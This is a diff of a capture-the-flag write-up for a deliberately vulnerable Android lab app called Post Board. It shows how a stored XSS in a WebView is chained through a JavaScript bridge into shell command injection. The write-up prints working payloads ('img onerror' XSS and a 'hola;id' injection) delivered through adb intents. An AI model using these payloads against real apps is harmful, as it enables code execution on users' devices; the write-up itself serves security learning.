@@ -1,6 +1,31 @@
+---
+title: Mobile Hacking Lab - Post Board
+description: "Welcome to the Android Insecure WebView Challenge! This challenge is designed to delve into the complexities of Android's WebView component, exploiting a Cross-Site Scripting (XSS) vulnerability to achieve Remote Code Execution (RCE). It's an immersive opportunity for participants to engage with Android application security, particularly focusing on WebView security issues."
+tags:
+  - webviews
+  - XSS
+  - code-executio
+  - intents-extra
+  - adb
+  - MobileHackingLab
+  - android
+keywords:
+  - android reversing
+  - ctf writeup
+  - MHL
+  - MobileHackingLab
+  - Mobile Hacking Lab
+  - mobile writeups
+  - apk decompilation
+  - frida tool
+  - mobile security research
+canonical: https://lautarovculic.github.io/writeups/Mobile%20Hacking%20Lab%20-%20Post%20Board/
+---
+
 **Description**: Welcome to the **Android Insecure WebView Challenge**! This challenge is designed to delve into the complexities of Android's WebView component, exploiting a Cross-Site Scripting (XSS) vulnerability to achieve Remote Code Execution (RCE). It's an immersive opportunity for participants to engage with Android application security, particularly focusing on WebView security issues.
 
 **Download**: https://lautarovculic.com/my_files/postBoard.apk
+
 **Link**:https://www.mobilehackinglab.com/path-player?courseid=lab-webview
 
 ![[postBoard.png]]
@@ -11,10 +36,13 @@ adb install -r postBoard.apk
 ```
 
 So, a simple test with `<img src=asd onerror=alert('xss');>` it's work.
+
 We can craft a **storaged XSS** in the app.
+
 The way of find a **RCE**, is looking the **source code**.
 
 Let's inspect the **source code** with **jadx**
+
 We have the **MainActivity** exported that **handle an Intent**
 ```XML
 <activity
@@ -42,7 +70,9 @@ adb shell am start -a android.intent.action.VIEW \
 com.mobilehackinglab.postboard
 ```
 But
+
 **Why base64?**
+
 We can see in the `handleIntent()` method
 ```java
 private final void handleIntent() {
@@ -78,6 +108,7 @@ private final void handleIntent() {
 That there are a **base64** decode in the message.
 
 But if we send a **malformed base64**, we can see a *cow* that say
+
 ![[postBoard2.png]]
 
 Notice that **JavaScript** is enabled in the `setupWebView()` method
@@ -86,10 +117,13 @@ webView.getSettings().setJavaScriptEnabled(true);
 ```
 
 Inside of the app, we can see in the **resources directory**, that there are **two files**.
+
 `cowsay.sh` and `index.html`.
+
 The `index.html` file is the content of the **WebView**. And the `cowsay.sh` is the *error handler* when we send a *bad base-64*.
 
 But, **why an `.sh` file?** well, if we pay attention in the **MainActivity.java** class, we can found another class: **`CowsayUtil`**
+
 That have the following interesting code:
 ```java
 public final String runCowsay(String message) {
@@ -159,6 +193,7 @@ That is used under
 activityMainBinding.webView.loadUrl("javascript:WebAppInterface.postCowsayMessage('" + e.getMessage() + "')");
 ```
 The `getMessage()` is `bad base-64` text.
+
 We can try change this with
 ```html
 <img src=asd onerror=WebAppInterface.postCowsayMessage('"hola"')>
@@ -173,6 +208,7 @@ com.mobilehackinglab.postboard
 ![[postBoard3.png]]
 
 We can see that the **text has been changed**.
+
 So, we can use `;` to execute a command?
 ```html
 <img src="asd" onerror="WebAppInterface.postCowsayMessage('hola;id')"> 
@@ -191,6 +227,7 @@ com.mobilehackinglab.postboard
 ```
 
 ![[postBoard4.png]]
+
 And we got **RCE**!
 
 You can **craft an app** with this **`MainActivity.java`** class
@@ -243,7 +280,5 @@ And **`activity_main.xml`**
         android:layout_centerInParent="true"/>
 </RelativeLayout>
 ```
-
-
 
 I hope you found it useful (:
